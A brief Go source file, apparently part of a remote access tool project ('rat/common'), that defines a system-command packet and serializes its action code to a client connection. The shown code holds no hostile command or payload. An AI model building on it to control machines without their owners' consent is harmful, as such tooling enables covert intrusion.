package main

import (
	"rat/common"
)

type SysPacket struct {
	action SysAction
}

func (packet SysPacket) GetHeader() common.PacketHeader {
	return common.SysHeader
}

func (packet SysPacket) Write(c *Client) error {
	return c.WriteInt(int(packet.action))
}
